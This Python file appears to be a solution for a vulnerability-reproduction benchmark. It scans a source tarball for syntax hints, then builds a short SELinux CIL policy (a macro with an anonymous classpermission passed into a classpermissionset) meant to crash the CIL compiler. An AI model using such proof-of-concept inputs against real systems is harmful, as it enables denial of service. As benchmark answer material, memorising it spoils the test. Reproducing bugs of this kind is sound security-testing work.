import os
import re
import tarfile
from typing import Optional


class Solution:
    def _scan_tarball_for_hints(self, src_path: str) -> tuple[bool, bool]:
        use_call = True
        use_dollar = False

        def consider_data(data: bytes) -> None:
            nonlocal use_call, use_dollar
            if b"(call" in data:
                use_call = True
            if b"(macro" in data and (b"$1" in data or b"$2" in data):
                use_dollar = True

        try:
            if os.path.isdir(src_path):
                for root, _, files in os.walk(src_path):
                    for fn in files:
                        if not fn.endswith((".cil", ".md", ".txt", ".rst", ".c", ".h")):
                            continue
                        p = os.path.join(root, fn)
                        try:
                            st = os.stat(p)
                        except OSError:
                            continue
                        if st.st_size <= 0 or st.st_size > 1_500_000:
                            continue
                        try:
                            with open(p, "rb") as f:
                                data = f.read()
                            consider_data(data)
                            if use_dollar and use_call:
                                return use_call, use_dollar
                        except OSError:
                            continue
                return use_call, use_dollar

            if not tarfile.is_tarfile(src_path):
                return use_call, use_dollar

            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    n = m.name.lower()
                    if not n.endswith((".cil", ".md", ".txt", ".rst", ".c", ".h")):
                        continue
                    if m.size <= 0 or m.size > 1_500_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    consider_data(data)
                    if use_dollar and use_call:
                        return use_call, use_dollar
        except Exception:
            pass

        return use_call, use_dollar

    def solve(self, src_path: str) -> bytes:
        use_call, use_dollar = self._scan_tarball_for_hints(src_path)

        # Use very short identifiers to minimize PoC size.
        # Key elements:
        # - macro takes a classpermission parameter
        # - macro defines a classpermissionset containing that parameter
        # - macro is called with an anonymous classpermission (c(p))
        if use_dollar:
            macro_body = "(classpermissionset s($1))"
            poc = "(class c(p))(macro m((x classpermission))" + macro_body + ")"
            if use_call:
                poc += "(call m(c(p)))"
            else:
                poc += "(m(c(p)))"
        else:
            macro_body = "(classpermissionset s(x))"
            poc = "(class c(p))(macro m((x classpermission))" + macro_body + ")"
            if use_call:
                poc += "(call m(c(p)))"
            else:
                poc += "(m(c(p)))"

        return poc.encode("utf-8")